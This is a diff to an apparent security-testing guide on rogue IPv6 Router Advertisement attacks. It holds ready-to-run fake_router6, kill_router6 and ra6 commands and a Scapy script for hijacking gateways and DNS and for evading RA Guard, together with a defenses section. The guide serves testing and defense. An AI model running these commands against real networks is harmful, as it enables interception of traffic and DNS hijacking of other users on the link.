@@ -16,20 +16,20 @@ A malicious RA sent to `ff02::1` (all-nodes multicast) can:
 1. Override the legitimate default gateway
 2. Announce a new IPv6 prefix (causing SLAAC misconfiguration)
 3. Announce attacker-controlled DNS servers (via RDNSS option)
-4. Set router lifetime to 0 (remove the legitimate default route)
+4. Set router lifetime to 0 when spoofing a router's link-local source address (remove that router from victims' default-router lists)
 
 ## Method 1: fake_router6 (THC-IPv6)
 
 ```bash
 # Announce attacker as default router with new prefix
 
-sudo fake_router6 eth0 2001:db8:attacker::/64
+sudo fake_router6 eth0 2001:db8:dead:beef::/64
 
-# Announce with high router preference (overrides existing routers)
-sudo fake_router6 -H eth0 2001:db8:attacker::/64
+# Add a hop-by-hop extension header while advertising the same prefix
+sudo fake_router6 -H eth0 2001:db8:dead:beef::/64
 
-# Set router lifetime to 0 (remove all default routes from victims)
-sudo fake_router6 eth0 ::/0 0
+# Use the THC kill helper to send zero-lifetime RAs for observed routers
+sudo kill_router6 eth0 '*'
 ```
 
 ## Method 2: ra6 (SI6 Networks Toolkit)
@@ -37,17 +37,17 @@ sudo fake_router6 eth0 ::/0 0
 ```bash
 # Send RA with attacker-controlled prefix
 sudo ra6 -i eth0 \
-  -P 2001:db8:attacker::/64 \
-  --router-lifetime 3600 \
-  --rdnss 2001:db8::evil-dns
+  -P 2001:db8:dead:beef::/64#LA \
+  --lifetime 3600 \
+  -N 3600#2001:db8::53
 
 # Send to all-nodes multicast
-sudo ra6 -i eth0 -d ff02::1 -P 2001:db8:attacker::/64
+sudo ra6 -i eth0 -d ff02::1 -P 2001:db8:dead:beef::/64#LA
 
 # Continuous RA to maintain control
 sudo ra6 -i eth0 -d ff02::1 \
-  -P 2001:db8:attacker::/64 \
-  --rdnss 2001:db8::evil-dns \
+  -P 2001:db8:dead:beef::/64#LA \
+  -N 3600#2001:db8::53 \
   --loop --sleep 30
 ```
 
@@ -62,7 +62,7 @@ attacker_mac = get_if_hwaddr(iface)
 
 ra = Ether(src=attacker_mac, dst="33:33:00:00:00:01") / \
      IPv6(
-         src="fe80::attacker",
+         src="fe80::1234",
          dst="ff02::1",
          hlim=255
      ) / \
@@ -77,11 +77,11 @@ ra = Ether(src=attacker_mac, dst="33:33:00:00:00:01") / \
          L=1, A=1,
          validlifetime=86400,
          preferredlifetime=14400,
-         prefix="2001:db8:attacker::"
+         prefix="2001:db8:dead:beef::"
      ) / \
      ICMPv6NDOptRDNSS(
          lifetime=3600,
-         dns=["2001:db8::evil-dns"]
+         dns=["2001:db8::53"]
      )
 
 # Send continuously
@@ -95,7 +95,7 @@ sendp(ra, iface=iface, loop=1, inter=30)
 ip -6 route show default
 
 # Check if victim configured SLAAC address from attacker's prefix
-ip -6 addr show | grep 2001:db8:attacker
+ip -6 addr show | grep 2001:db8:dead:beef
 
 # Check if DNS changed to attacker's server
 cat /etc/resolv.conf
@@ -105,14 +105,14 @@ resolvectl status | grep "DNS Servers"
 
 ## Testing RA Guard Bypass
 
-Some RA Guard implementations can be bypassed with extension headers:
+Older or naive RA Guard implementations can be bypassed with extension headers:
 
 ```bash
-# RA with fragmentation header (bypass naive RA Guard)
-sudo ra6 -i eth0 --frag-hdr -P 2001:db8:attacker::/64 -d ff02::1
+# Fragmented RA test case (legacy/non-RFC 6980 targets; modern hosts should ignore it)
+sudo ra6 -i eth0 --frag-hdr 80 -P 2001:db8:dead:beef::/64#LA -d ff02::1
 
 # RA with hop-by-hop header (bypass type-based RA Guard)
-sudo ra6 -i eth0 --hbh-opt -P 2001:db8:attacker::/64 -d ff02::1
+sudo ra6 -i eth0 --hbh-opt-hdr 8 -P 2001:db8:dead:beef::/64#LA -d ff02::1
 ```
 
 ## Validating RA Guard Configuration
@@ -130,7 +130,7 @@ sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 134'
 ## Defenses
 
 ```bash
-# Block unsolicited RAs with ip6tables (host-based)
+# Drop RA packets that fail the required hop-limit check (host-based)
 sudo ip6tables -A INPUT \
   -p icmpv6 --icmpv6-type router-advertisement \
   -m hl ! --hl-eq 255 \
@@ -138,11 +138,12 @@ sudo ip6tables -A INPUT \
 
 # The legitimate RA from your router will have hop-limit 255
 # Spoofed RAs from off-link sources will have lower hop-limit
+# This does not stop on-link rogue RAs; use RA Guard or source allow-lists for that.
 ```
 
 | Defense | Notes |
 |---|---|
-| RA Guard (RFC 6105) | Configure on all managed switch ports |
+| RA Guard (RFC 6105; RFC 7113 guidance) | Configure on all managed switch ports |
 | SEND | Cryptographic RA signing |
 | ip6tables | Host-level RA filtering |
 | NDPMon | Alerts on new routers |
